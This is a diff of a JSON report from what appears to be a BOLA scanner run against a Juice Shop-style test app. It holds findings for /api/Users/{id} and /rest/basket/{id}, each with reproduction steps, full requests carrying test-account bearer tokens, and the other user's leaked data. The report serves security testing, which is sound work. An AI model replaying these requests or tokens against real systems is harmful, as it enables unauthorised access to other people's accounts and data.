@@ -4,23 +4,23 @@
     "version": "1.0.0",
     "target": "http://192.168.8.142:3000",
     "spec": "discover",
-    "scan_timestamp": "2026-09-16T12:58:20.418398+00:00",
-    "elapsed_seconds": 16.46,
-    "total_findings": 2
+    "scan_timestamp": "2026-09-18T04:14:23.787108+00:00",
+    "elapsed_seconds": 20.05,
+    "total_findings": 3
   },
   "findings": [
     {
-      "operation_id": "GET:/rest/basket/{id}",
+      "operation_id": "GET:/api/Users/{id}",
       "severity": "High",
       "api_type": "rest",
       "method": "GET",
-      "path_or_query": "/rest/basket/{id}",
+      "path_or_query": "/api/Users/{id}",
       "similarity_score": 1.0,
       "field_leakage": [],
       "reproduction_steps": [
         "1. Authenticate as User B and obtain their object identifier.",
         "2. Authenticate as User A (attacker session).",
-        "3. Issue GET request to: http://192.168.8.142:3000/rest/basket/2",
+        "3. Issue GET request to: http://192.168.8.142:3000/api/Users/2",
         "4. Include User A's authentication credentials in the Authorization header.",
         "5. Observe HTTP 200 response \u2014 data belonging to User B is returned.",
         "6. Compare response to User B's own authenticated response \u2014 data is substantially identical.",
@@ -29,14 +29,14 @@
       "evidence": {
         "request_a": {
           "method": "GET",
-          "url": "http://192.168.8.142:3000/rest/basket/2",
+          "url": "http://192.168.8.142:3000/api/Users/2",
           "headers": {
             "User-Agent": "BOLA-Framework/1.0",
             "Accept-Encoding": "gzip, deflate",
             "Accept": "application/json, text/html, */*",
             "Connection": "keep-alive",
             "Content-Type": "application/json",
-            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6InVzZXJhQHRlc3QuY29tIiwicGFzc3dvcmQiOiIwY2VmMWZiMTBmNjA1MjkwMjhhNzFmNThlNTRlZDA3YiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDktMTYgMTI6NTI6NTYuNDU3ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDktMTYgMTI6NTI6NTYuNDU3ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImJpZCI6NiwiaWF0IjoxNzg5NTYzMjM3fQ.cq-YjDO8LV8xd5kr8byvY9yD216Ei69LHcOFLFTx2OiYfjO313yOlcEimKDPBpTZIujFlRLpzC5He-k7w7a68nnfgOHud9HhabNwhCz1PhxzCghInlpG1ktYbbYVhYxTXddFGr2VWG0Y8l0wsbThZKriqH0Md1SlSc_95s6OF8o"
+            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6InVzZXJhQHRlc3QuY29tIiwicGFzc3dvcmQiOiIwY2VmMWZiMTBmNjA1MjkwMjhhNzFmNThlNTRlZDA3YiIsInJvbGUiOiJkZWx1eGUiLCJkZWx1eGVUb2tlbiI6ImI3ZTRhZjRkM2EwYWNiMGI0MTBhM2FlYzBiMTk0NmNhNWZhYmI1ZmI5M2Y2NDY4YmRjZmNkOGE1ZGRkZGM3MzgiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTA5LTE3IDE2OjA0OjQ3LjUzMCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTA5LTE4IDAzOjU2OjIyLjMwMyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJiaWQiOjYsImlhdCI6MTc4OTcwNDg0NX0.W_N2duDz8hO4nKy7Sxfzspv14apycu0Bz7JTR30wdcquSkiW4DWKF78OCCutz4YEVvt0fk6FTyPG5MD1gaRSkEPzd_c-M3ZEeQmR7z3GzEqMKFBAUnj0NB1ndz54PPxDxsg50DSU9h303Is9BwSkjqEmopd0JWDQpbbkrvT5TZM"
           },
           "body": null
         },
@@ -46,45 +46,30 @@
             "status": "success",
             "data": {
               "id": 2,
-              "coupon": null,
-              "UserId": 2,
-              "createdAt": "2026-09-16T12:51:25.242Z",
-              "updatedAt": "2026-09-16T12:51:25.242Z",
-              "Products": [
-                {
-                  "id": 4,
-                  "name": "Raspberry Juice (1000ml)",
-                  "description": "Made from blended Raspberry Pi, water and sugar.",
-                  "price": 4.99,
-                  "deluxePrice": 4.99,
-                  "image": "raspberry_juice.jpg",
-                  "createdAt": "2026-09-16T12:51:24.164Z",
-                  "updatedAt": "2026-09-16T12:51:24.164Z",
-                  "deletedAt": null,
-                  "BasketItem": {
-                    "ProductId": 4,
-                    "BasketId": 2,
-                    "id": 4,
-                    "quantity": 2,
-                    "createdAt": "2026-09-16T12:51:25.495Z",
-                    "updatedAt": "2026-09-16T12:51:25.495Z"
-                  }
-                }
-              ]
+              "username": "",
+              "email": "jim@juice-sh.op",
+              "role": "customer",
+              "deluxeToken": "",
+              "lastLoginIp": "",
+              "profileImage": "assets/public/images/uploads/default.svg",
+              "isActive": true,
+              "createdAt": "2026-09-17T16:01:55.733Z",
+              "updatedAt": "2026-09-17T16:01:55.733Z",
+              "deletedAt": null
             }
           },
-          "elapsed_ms": 94.36
+          "elapsed_ms": 69.18
         },
         "request_b": {
           "method": "GET",
-          "url": "http://192.168.8.142:3000/rest/basket/2",
+          "url": "http://192.168.8.142:3000/api/Users/2",
           "headers": {
             "User-Agent": "BOLA-Framework/1.0",
             "Accept-Encoding": "gzip, deflate",
             "Accept": "application/json",
             "Connection": "keep-alive",
             "Content-Type": "application/json",
-            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6InVzZXJiQHRlc3QuY29tIiwicGFzc3dvcmQiOiIwMjJiNWFjN2VhNzJhNWVlM2JmYzZiM2ViNDYxZjJmYyIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDktMTYgMTI6NTM6NDMuMjU1ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDktMTYgMTI6NTM6NDMuMjU1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImJpZCI6NywiaWF0IjoxNzg5NTYzMjQxfQ.f0NFwfj18deLhYDac6IQaHLhLMIZJOPB1jEzXjMHGwcWTsoMNJWwhpVW1oR8CUj_sKNj_HP6R0wPBROG2iVT7wII7cHVqR2OY5S6U9ubJIMDccHsL8NTW9j_tgTlVegHAJNXDSC3rGKXVE4J1kjillwM2kfgaXCUcs1gkM_ab_4"
+            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6InVzZXJiQHRlc3QuY29tIiwicGFzc3dvcmQiOiIwMjJiNWFjN2VhNzJhNWVlM2JmYzZiM2ViNDYxZjJmYyIsInJvbGUiOiJkZWx1eGUiLCJkZWx1eGVUb2tlbiI6IjhkYzlmNzc2NmU4YzA0NmE1MjE5NTllMmEwNzU0YjBhZmZhZTA1ZWVhOWE2NTk1MWFjNTY0ZjhiYmE3OGViMjUiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOS0xNyAxNjowNTowOC4yNjEgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOS0xOCAwMzo1NjoyNC45ODMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjo3LCJpYXQiOjE3ODk3MDQ4NDl9.TcVOK34T1BMw5Bs_QTFl5rRKCPWsSqUlN2Xc_olEpaGTKO2KcTAeB3ZxW_8uOnvRbp63n9E6WOWr03swEDrFuXlXgBCY23ZAKEZuR--lXiPbLQ2tH3Qu1IBrQ18hx5SmjT_AL3jBKDw3B4To0XrEHa5Ht95Vsw0TJgfVg9irYqg"
           },
           "body": null
         },
@@ -94,34 +79,19 @@
             "status": "success",
             "data": {
               "id": 2,
-              "coupon": null,
-              "UserId": 2,
-              "createdAt": "2026-09-16T12:51:25.242Z",
-              "updatedAt": "2026-09-16T12:51:25.242Z",
-              "Products": [
-                {
-                  "id": 4,
-                  "name": "Raspberry Juice (1000ml)",
-                  "description": "Made from blended Raspberry Pi, water and sugar.",
-                  "price": 4.99,
-                  "deluxePrice": 4.99,
-                  "image": "raspberry_juice.jpg",
-                  "createdAt": "2026-09-16T12:51:24.164Z",
-                  "updatedAt": "2026-09-16T12:51:24.164Z",
-                  "deletedAt": null,
-                  "BasketItem": {
-                    "ProductId": 4,
-                    "BasketId": 2,
-                    "id": 4,
-                    "quantity": 2,
-                    "createdAt": "2026-09-16T12:51:25.495Z",
-                    "updatedAt": "2026-09-16T12:51:25.495Z"
-                  }
-                }
-              ]
+              "username": "",
+              "email": "jim@juice-sh.op",
+              "role": "customer",
+              "deluxeToken": "",
+              "lastLoginIp": "",
+              "profileImage": "assets/public/images/uploads/default.svg",
+              "isActive": true,
+              "createdAt": "2026-09-17T16:01:55.733Z",
+              "updatedAt": "2026-09-17T16:01:55.733Z",
+              "deletedAt": null
             }
           },
-          "elapsed_ms": 92.34
+          "elapsed_ms": 69.67
         },
         "diff": {}
       }
@@ -153,7 +123,7 @@
             "Accept": "application/json, text/html, */*",
             "Connection": "keep-alive",
             "Content-Type": "application/json",
-            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6InVzZXJhQHRlc3QuY29tIiwicGFzc3dvcmQiOiIwY2VmMWZiMTBmNjA1MjkwMjhhNzFmNThlNTRlZDA3YiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDktMTYgMTI6NTI6NTYuNDU3ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDktMTYgMTI6NTI6NTYuNDU3ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImJpZCI6NiwiaWF0IjoxNzg5NTYzMjM3fQ.cq-YjDO8LV8xd5kr8byvY9yD216Ei69LHcOFLFTx2OiYfjO313yOlcEimKDPBpTZIujFlRLpzC5He-k7w7a68nnfgOHud9HhabNwhCz1PhxzCghInlpG1ktYbbYVhYxTXddFGr2VWG0Y8l0wsbThZKriqH0Md1SlSc_95s6OF8o"
+            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6InVzZXJhQHRlc3QuY29tIiwicGFzc3dvcmQiOiIwY2VmMWZiMTBmNjA1MjkwMjhhNzFmNThlNTRlZDA3YiIsInJvbGUiOiJkZWx1eGUiLCJkZWx1eGVUb2tlbiI6ImI3ZTRhZjRkM2EwYWNiMGI0MTBhM2FlYzBiMTk0NmNhNWZhYmI1ZmI5M2Y2NDY4YmRjZmNkOGE1ZGRkZGM3MzgiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTA5LTE3IDE2OjA0OjQ3LjUzMCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTA5LTE4IDAzOjU2OjIyLjMwMyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJiaWQiOjYsImlhdCI6MTc4OTcwNDg0NX0.W_N2duDz8hO4nKy7Sxfzspv14apycu0Bz7JTR30wdcquSkiW4DWKF78OCCutz4YEVvt0fk6FTyPG5MD1gaRSkEPzd_c-M3ZEeQmR7z3GzEqMKFBAUnj0NB1ndz54PPxDxsg50DSU9h303Is9BwSkjqEmopd0JWDQpbbkrvT5TZM"
           },
           "body": null
         },
@@ -170,12 +140,12 @@
               "lastLoginIp": "",
               "profileImage": "assets/public/images/uploads/default.svg",
               "isActive": true,
-              "createdAt": "2026-09-16T12:51:21.423Z",
-              "updatedAt": "2026-09-16T12:51:21.423Z",
+              "createdAt": "2026-09-17T16:01:55.733Z",
+              "updatedAt": "2026-09-17T16:01:55.733Z",
               "deletedAt": null
             }
           },
-          "elapsed_ms": 167.56
+          "elapsed_ms": 78.35
         },
         "request_b": {
           "method": "GET",
@@ -186,7 +156,7 @@
             "Accept": "application/json",
             "Connection": "keep-alive",
             "Content-Type": "application/json",
-            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6InVzZXJiQHRlc3QuY29tIiwicGFzc3dvcmQiOiIwMjJiNWFjN2VhNzJhNWVlM2JmYzZiM2ViNDYxZjJmYyIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjYtMDktMTYgMTI6NTM6NDMuMjU1ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjYtMDktMTYgMTI6NTM6NDMuMjU1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImJpZCI6NywiaWF0IjoxNzg5NTYzMjQxfQ.f0NFwfj18deLhYDac6IQaHLhLMIZJOPB1jEzXjMHGwcWTsoMNJWwhpVW1oR8CUj_sKNj_HP6R0wPBROG2iVT7wII7cHVqR2OY5S6U9ubJIMDccHsL8NTW9j_tgTlVegHAJNXDSC3rGKXVE4J1kjillwM2kfgaXCUcs1gkM_ab_4"
+            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6InVzZXJiQHRlc3QuY29tIiwicGFzc3dvcmQiOiIwMjJiNWFjN2VhNzJhNWVlM2JmYzZiM2ViNDYxZjJmYyIsInJvbGUiOiJkZWx1eGUiLCJkZWx1eGVUb2tlbiI6IjhkYzlmNzc2NmU4YzA0NmE1MjE5NTllMmEwNzU0YjBhZmZhZTA1ZWVhOWE2NTk1MWFjNTY0ZjhiYmE3OGViMjUiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOS0xNyAxNjowNTowOC4yNjEgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOS0xOCAwMzo1NjoyNC45ODMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjo3LCJpYXQiOjE3ODk3MDQ4NDl9.TcVOK34T1BMw5Bs_QTFl5rRKCPWsSqUlN2Xc_olEpaGTKO2KcTAeB3ZxW_8uOnvRbp63n9E6WOWr03swEDrFuXlXgBCY23ZAKEZuR--lXiPbLQ2tH3Qu1IBrQ18hx5SmjT_AL3jBKDw3B4To0XrEHa5Ht95Vsw0TJgfVg9irYqg"
           },
           "body": null
         },
@@ -203,12 +173,129 @@
               "lastLoginIp": "",
               "profileImage": "assets/public/images/uploads/default.svg",
               "isActive": true,
-              "createdAt": "2026-09-16T12:51:21.423Z",
-              "updatedAt": "2026-09-16T12:51:21.423Z",
+              "createdAt": "2026-09-17T16:01:55.733Z",
+              "updatedAt": "2026-09-17T16:01:55.733Z",
               "deletedAt": null
             }
           },
-          "elapsed_ms": 71.28
+          "elapsed_ms": 71.64
+        },
+        "diff": {}
+      }
+    },
+    {
+      "operation_id": "GET:/rest/basket/{id}",
+      "severity": "High",
+      "api_type": "rest",
+      "method": "GET",
+      "path_or_query": "/rest/basket/{id}",
+      "similarity_score": 1.0,
+      "field_leakage": [],
+      "reproduction_steps": [
+        "1. Authenticate as User B and obtain their object identifier.",
+        "2. Authenticate as User A (attacker session).",
+        "3. Issue GET request to: http://192.168.8.142:3000/rest/basket/2",
+        "4. Include User A's authentication credentials in the Authorization header.",
+        "5. Observe HTTP 200 response \u2014 data belonging to User B is returned.",
+        "6. Compare response to User B's own authenticated response \u2014 data is substantially identical.",
+        "7. Confirm BOLA: User A accessed User B's resource without authorization."
+      ],
+      "evidence": {
+        "request_a": {
+          "method": "GET",
+          "url": "http://192.168.8.142:3000/rest/basket/2",
+          "headers": {
+            "User-Agent": "BOLA-Framework/1.0",
+            "Accept-Encoding": "gzip, deflate",
+            "Accept": "application/json, text/html, */*",
+            "Connection": "keep-alive",
+            "Content-Type": "application/json",
+            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNSwidXNlcm5hbWUiOiIiLCJlbWFpbCI6InVzZXJhQHRlc3QuY29tIiwicGFzc3dvcmQiOiIwY2VmMWZiMTBmNjA1MjkwMjhhNzFmNThlNTRlZDA3YiIsInJvbGUiOiJkZWx1eGUiLCJkZWx1eGVUb2tlbiI6ImI3ZTRhZjRkM2EwYWNiMGI0MTBhM2FlYzBiMTk0NmNhNWZhYmI1ZmI5M2Y2NDY4YmRjZmNkOGE1ZGRkZGM3MzgiLCJsYXN0TG9naW5JcCI6IiIsInByb2ZpbGVJbWFnZSI6Ii9hc3NldHMvcHVibGljL2ltYWdlcy91cGxvYWRzL2RlZmF1bHQuc3ZnIiwidG90cFNlY3JldCI6IiIsImlzQWN0aXZlIjp0cnVlLCJjcmVhdGVkQXQiOiIyMDI2LTA5LTE3IDE2OjA0OjQ3LjUzMCArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDI2LTA5LTE4IDAzOjU2OjIyLjMwMyArMDA6MDAiLCJkZWxldGVkQXQiOm51bGx9LCJiaWQiOjYsImlhdCI6MTc4OTcwNDg0NX0.W_N2duDz8hO4nKy7Sxfzspv14apycu0Bz7JTR30wdcquSkiW4DWKF78OCCutz4YEVvt0fk6FTyPG5MD1gaRSkEPzd_c-M3ZEeQmR7z3GzEqMKFBAUnj0NB1ndz54PPxDxsg50DSU9h303Is9BwSkjqEmopd0JWDQpbbkrvT5TZM"
+          },
+          "body": null
+        },
+        "response_a": {
+          "status_code": 200,
+          "body": {
+            "status": "success",
+            "data": {
+              "id": 2,
+              "coupon": null,
+              "UserId": 2,
+              "createdAt": "2026-09-17T16:01:59.167Z",
+              "updatedAt": "2026-09-17T16:01:59.167Z",
+              "Products": [
+                {
+                  "id": 4,
+                  "name": "Raspberry Juice (1000ml)",
+                  "description": "Made from blended Raspberry Pi, water and sugar.",
+                  "price": 4.99,
+                  "deluxePrice": 4.99,
+                  "image": "raspberry_juice.jpg",
+                  "createdAt": "2026-09-17T16:01:58.284Z",
+                  "updatedAt": "2026-09-17T16:01:58.284Z",
+                  "deletedAt": null,
+                  "BasketItem": {
+                    "ProductId": 4,
+                    "BasketId": 2,
+                    "id": 4,
+                    "quantity": 2,
+                    "createdAt": "2026-09-17T16:01:59.391Z",
+                    "updatedAt": "2026-09-17T16:01:59.391Z"
+                  }
+                }
+              ]
+            }
+          },
+          "elapsed_ms": 75.49
+        },
+        "request_b": {
+          "method": "GET",
+          "url": "http://192.168.8.142:3000/rest/basket/2",
+          "headers": {
+            "User-Agent": "BOLA-Framework/1.0",
+            "Accept-Encoding": "gzip, deflate",
+            "Accept": "application/json",
+            "Connection": "keep-alive",
+            "Content-Type": "application/json",
+            "Authorization": "Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJkYXRhIjp7ImlkIjoyNiwidXNlcm5hbWUiOiIiLCJlbWFpbCI6InVzZXJiQHRlc3QuY29tIiwicGFzc3dvcmQiOiIwMjJiNWFjN2VhNzJhNWVlM2JmYzZiM2ViNDYxZjJmYyIsInJvbGUiOiJkZWx1eGUiLCJkZWx1eGVUb2tlbiI6IjhkYzlmNzc2NmU4YzA0NmE1MjE5NTllMmEwNzU0YjBhZmZhZTA1ZWVhOWE2NTk1MWFjNTY0ZjhiYmE3OGViMjUiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyNi0wOS0xNyAxNjowNTowOC4yNjEgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyNi0wOS0xOCAwMzo1NjoyNC45ODMgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiYmlkIjo3LCJpYXQiOjE3ODk3MDQ4NDl9.TcVOK34T1BMw5Bs_QTFl5rRKCPWsSqUlN2Xc_olEpaGTKO2KcTAeB3ZxW_8uOnvRbp63n9E6WOWr03swEDrFuXlXgBCY23ZAKEZuR--lXiPbLQ2tH3Qu1IBrQ18hx5SmjT_AL3jBKDw3B4To0XrEHa5Ht95Vsw0TJgfVg9irYqg"
+          },
+          "body": null
+        },
+        "response_b": {
+          "status_code": 200,
+          "body": {
+            "status": "success",
+            "data": {
+              "id": 2,
+              "coupon": null,
+              "UserId": 2,
+              "createdAt": "2026-09-17T16:01:59.167Z",
+              "updatedAt": "2026-09-17T16:01:59.167Z",
+              "Products": [
+                {
+                  "id": 4,
+                  "name": "Raspberry Juice (1000ml)",
+                  "description": "Made from blended Raspberry Pi, water and sugar.",
+                  "price": 4.99,
+                  "deluxePrice": 4.99,
+                  "image": "raspberry_juice.jpg",
+                  "createdAt": "2026-09-17T16:01:58.284Z",
+                  "updatedAt": "2026-09-17T16:01:58.284Z",
+                  "deletedAt": null,
+                  "BasketItem": {
+                    "ProductId": 4,
+                    "BasketId": 2,
+                    "id": 4,
+                    "quantity": 2,
+                    "createdAt": "2026-09-17T16:01:59.391Z",
+                    "updatedAt": "2026-09-17T16:01:59.391Z"
+                  }
+                }
+              ]
+            }
+          },
+          "elapsed_ms": 72.91
         },
         "diff": {}
       }
